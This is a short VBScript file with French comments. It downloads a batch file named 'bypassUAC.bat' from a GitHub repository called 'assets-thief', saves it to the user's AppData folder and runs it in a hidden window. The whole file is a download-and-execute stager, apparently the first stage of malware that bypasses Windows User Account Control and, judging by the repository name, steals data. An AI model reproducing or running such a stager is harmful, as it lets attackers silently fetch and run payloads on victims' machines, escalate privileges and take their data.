' Créer l'objet WScript.Shell
Set WshShell = CreateObject("WScript.Shell")

' Créer l'objet XMLHTTP pour télécharger le fichier
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objStream = CreateObject("ADODB.Stream")

' URL du fichier à télécharger
url = "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/bypassUAC.bat"

' Définir le chemin où enregistrer le fichier (par exemple, dans %AppData%)
savePath = WshShell.ExpandEnvironmentStrings("%AppData%") & "\bypassUAC.bat"

' Télécharger le fichier
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

' Enregistrer le fichier téléchargé
If objXMLHTTP.Status = 200 Then
    objStream.Open
    objStream.Type = 1  ' Type binaire
    objStream.Write objXMLHTTP.ResponseBody
    objStream.SaveToFile savePath, 2 ' 2 = écraser le fichier s'il existe
    objStream.Close
End If

' Exécuter le fichier téléchargé
WshShell.Run Chr(34) & savePath & Chr(34), 0

' Nettoyage des objets
Set objXMLHTTP = Nothing
Set objStream = Nothing
Set WshShell = Nothing
